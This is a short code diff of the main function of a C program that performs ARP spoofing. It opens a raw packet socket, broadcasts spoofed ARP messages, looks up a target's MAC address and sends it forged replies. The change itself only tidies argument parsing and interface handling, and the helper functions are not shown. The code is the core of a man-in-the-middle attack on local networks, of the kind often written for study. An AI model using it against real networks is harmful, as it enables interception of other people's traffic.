@@ -19,26 +19,16 @@ int main(int args, char* argv[])
     MAC my_mac, trgrt_mac;
     
     get_my_mac(argv[1], my_mac);
-    LOG(MAC_FORMAT(my_mac));
-    LOG("\n");
 
-    sscanf(argv[2], IP_FORMAT((uint32_t*) &frst_ip) );     // TODO
-    LOG(IP_FORMAT(frst_ip));
-    LOG("\n");
+    str_to_ip(argv[2], frst_ip);
 
-    sscanf(argv[3], IP_FORMAT((uint32_t*) &scnd_ip));
-    LOG(IP_FORMAT(scnd_ip));
-    LOG("\n");
-    
-
-    struct sockaddr_ll intrfce;
-    intrfce.sll_ifindex = if_nametoindex(argv[1]);
+    str_to_ip(argv[3], scnd_ip);
 
     int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
 
-    broadcast_spoofed_ip(my_mac, frst_ip, scnd_ip,&intrfce, sock);
+    broadcast_spoofed_ip(my_mac, frst_ip, scnd_ip,get_interface_sending(argv[1]), sock);
     get_target_mac(sock, scnd_ip, trgrt_mac);
-    send_spoofed_ip(my_mac, frst_ip, trgrt_mac, scnd_ip, &intrfce, sock);
+    send_spoofed_ip(my_mac, frst_ip, trgrt_mac, scnd_ip, get_interface_sending(argv[1]), sock);
 
     exit(EXIT_SUCCESS);
 }
